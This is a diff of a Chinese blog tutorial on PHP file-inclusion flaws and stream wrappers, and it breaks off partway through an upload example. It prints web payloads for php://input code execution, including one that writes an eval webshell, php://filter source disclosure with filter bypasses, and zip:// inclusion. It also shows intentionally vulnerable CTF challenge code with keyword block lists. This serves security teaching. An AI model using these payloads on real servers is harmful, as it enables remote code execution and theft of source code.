-<h3 id="1-2-文件包含分类：">1.2 文件包含分类：</h3>
+<h3 id="12-文件包含分类">1.2 文件包含分类：</h3>
 <p><strong>文件包含分为本地文件包含和远程文件包含，而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_ url_ include. 如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_ ur_ include=on, allow_ ur_ fopen = On。在php.ini中，allow_ url_ fopen默认一直是On,而allow_ url_ include从php5.2之后就默认为Off。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。
-远程文件包含：通过HTTP协议包含其他地方的资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="1-3-文件包含函数：">1.3 文件包含函数：</h3>
+<pre><code class="hljs plaintext">本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。
+远程文件包含：通过HTTP协议包含其他地方的资源</code></pre>
+<h3 id="13-文件包含函数">1.3 文件包含函数：</h3>
 <p><strong>1,  include():找不到被包含文件时会产生警告(E_ WARNING) ;</strong><br>
 <strong>2，include_ once(): 与include () 类似，代码已经被包含则不会再次包含</strong><br>
 <strong>3，require():找不到被包含的文件时会产生致命错误(E_ COMPILE ERROR)</strong><br>
 <strong>4，require_ once():与require ()类似，代码已经被包含则不会再次包含</strong></p>
 <p><strong>思维导图：</strong></p>
-<p><img src="image-20230321185813902.png" alt="image-20230321185813902"></p>
-<h2 id="0x02-PHP伪协议：">0x02 PHP伪协议：</h2>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321185813902.png" alt="image-20230321185813902"></p>
+<h2 id="0x02-php伪协议">0x02 PHP伪协议：</h2>
 <p><strong>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</strong></p>
-<h3 id="2-1-php-input">2.1 php://input</h3>
+<h3 id="21-phpinput">2.1 php://input</h3>
 <p><strong>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">poc：
+<pre><code class="hljs plaintext">poc：
 ?file=php://input
-[POST DATA] &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230321192756427.png" alt="image-20230321192756427"></p>
+[POST DATA] &lt;?php phpinfo();?&gt;</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321192756427.png" alt="image-20230321192756427"></p>
 <p><strong>注：利用php://input还可以写入php木马,即在post中传入如下代码：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code></pre>
 <p>例子：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">//test.php
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span><span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'I want flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"success\n"</span><span class="token punctuation">;</span>
-	<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+<pre><code class="hljs php"><span class="hljs-comment">//test.php</span>
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
+<span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>)) === <span class="hljs-string">'I want flag'</span>){
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">"success\n"</span>;
+	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+}
 
-<span class="token comment">//flag.php</span>
-<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
-<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag{flag_is_here}'</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="hljs-comment">//flag.php</span>
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$flag</span> = <span class="hljs-string">'flag{flag_is_here}'</span>;
+<span class="hljs-meta">?&gt;</span></code></pre>
 <p><strong>审计test.php知，当参数$a不为空，且读取的文件中包含’I want flag’时，即可显示$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。</strong><br>
 <strong>注：遇到file_get_contents()要想到用php://input绕过。</strong></p>
-<h3 id="2-2-php-filter">2.2 php://filter</h3>
+<h3 id="22-phpfilter">2.2 php://filter</h3>
 <p><strong>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</strong></p>
 <table>
 <thead>
@@ -515,11 +187,11 @@
 </tr>
 </tbody>
 </table>
-<pre class="line-numbers language-none"><code class="language-none">poc1:
+<pre><code class="hljs plaintext">poc1:
 ?file=php://filter/resource=xxx.php
 poc2:
-?file=php://filter/read=convert.base64-encode/resource=xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里
+?file=php://filter/read=convert.base64-encode/resource=xxx.php</code></pre>
+<pre><code class="hljs plaintext">为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里
 就会用到php://filter。
 php://filter读取文件源代码的时候
 需要用到编码器
@@ -531,36 +203,36 @@ php://filter是PHP语言中特有的协议流，作用是作为一个“中间�
 payload:file=php://filter/resource=flag.php
 也可以用一些没有过滤掉的编码方式和转换方式
 payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
-payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">怎么写入一句话木马?
+payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</code></pre>
+<pre><code class="hljs plaintext">怎么写入一句话木马?
 $filename = $_GET['file'];
 $content = $_GET['content'];
 file_put_contents($filename,"&lt;?php exit();".$content);
 
 exit() 退出程序
 这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配
-置文件等等不允许用户直接访问的文件当中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+置文件等等不允许用户直接访问的文件当中。</code></pre>
 <p><strong>exit死亡绕过参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></strong></p>
 <p><strong>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</strong></p>
 <p><strong>注：更多php://filter用法可参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></strong></p>
 <p><strong>eg1:</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phar://"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230321193810165.png" alt="image-20230321193810165"></p>
+<pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"php://input"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"zip://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"phar://"</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data:"</span>)){
+	<span class="hljs-keyword">exit</span>(<span class="hljs-string">'hacker!'</span>);
+}
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>){
+	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);
+}<span class="hljs-keyword">else</span>{
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=flag.php"&gt;tips&lt;/a&gt;'</span>;
+}
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321193810165.png" alt="image-20230321193810165"></p>
 <p><strong>尝试payload：?file=php://filter/resource=flag.php，发现无法显示内容</strong>：</p>
 <p><strong>尝试payload：?file=php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：</strong></p>
-<h3 id="2-3-zip">2.3 zip://</h3>
+<h3 id="23-zip">2.3 zip://</h3>
 <p><strong>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</strong></p>
 <pre><code>zip://中只能传入绝对路径。(php版本大于等于php5.3.0)
 
@@ -571,55 +243,55 @@ exit() 退出程序
 相同的类型的还有zlib://和bzip2://
 file=compress.zlib://flag.php
 </code></pre>
-<pre class="line-numbers language-none"><code class="language-none">poc:
+<pre><code class="hljs plaintext">poc:
 zip://[压缩包绝对路径]#[压缩包内文件]
-?file=zip://D:\zip.jpg%23phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+?file=zip://D:\zip.jpg%23phpinfo.txt</code></pre>
 <p><strong>例子：</strong></p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token comment">/*||stristr($file,"phar")*/</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hick?"</span><span class="token punctuation">;</span>
-	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter important">?&gt;</span></span>
-<span class="token comment">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload.php
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span>
-	 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fupload<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
- 	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload!<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
-you can upload jpg,png,zip....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fupload'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'fupload'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment">//文件名</span>
-    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//文件后缀</span>
-    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'fupload'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment">//文件大小</span>
-    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'fupload'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">// 存储在服务器的文件的临时副本的名称</span>
-    <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads\\"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpeg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"zip"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
-        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// No</span>
-            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">// Yes!</span>
-            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span><span class="token operator">.</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\\<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
- <span class="token delimiter important">?&gt;</span></span>
+<pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
+&lt;meta charset=<span class="hljs-string">"utf8"</span>&gt;
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
+<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
+<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$file</span>) <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span>;
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"input"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">"filter"</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">"data"</span>)<span class="hljs-comment">/*||stristr($file,"phar")*/</span>){
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">"hick?"</span>;
+	<span class="hljs-keyword">exit</span>();
+}<span class="hljs-keyword">else</span>{
+	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">".php"</span>);
+}
+<span class="hljs-meta">?&gt;</span>
+&lt;!-- flag在当前目录的某个文件中 --&gt;</code></pre>
+<pre><code class="hljs php"><span class="hljs-comment">//upload.php</span>
+&lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
+&lt;form action=<span class="hljs-string">"upload.php"</span> method=<span class="hljs-string">"post"</span> enctype=<span class="hljs-string">"multipart/form-data"</span> &gt;
+	 &lt;input type=<span class="hljs-string">"file"</span> name=<span class="hljs-string">"fupload"</span> /&gt;
+ 	&lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"upload!"</span> /&gt;
+&lt;/form&gt;
+you can upload jpg,png,zip....&lt;br /&gt;
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'fupload'</span>] ) ) {
+    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'name'</span> ];         <span class="hljs-comment">//文件名</span>
+    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);   <span class="hljs-comment">//文件后缀</span>
+    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'size'</span> ];         <span class="hljs-comment">//文件大小</span>
+    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'tmp_name'</span> ];     <span class="hljs-comment">// 存储在服务器的文件的临时副本的名称</span>
+    <span class="hljs-variable">$target_path</span> = <span class="hljs-string">"uploads\\"</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())).<span class="hljs-string">"."</span>.<span class="hljs-variable">$uploaded_ext</span>;
+    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpeg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"png"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"zip"</span> ) &amp;&amp;
+        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) {
+        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) {<span class="hljs-comment">// No</span>
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span>;
+        }
+        <span class="hljs-keyword">else</span> {<span class="hljs-comment">// Yes!</span>
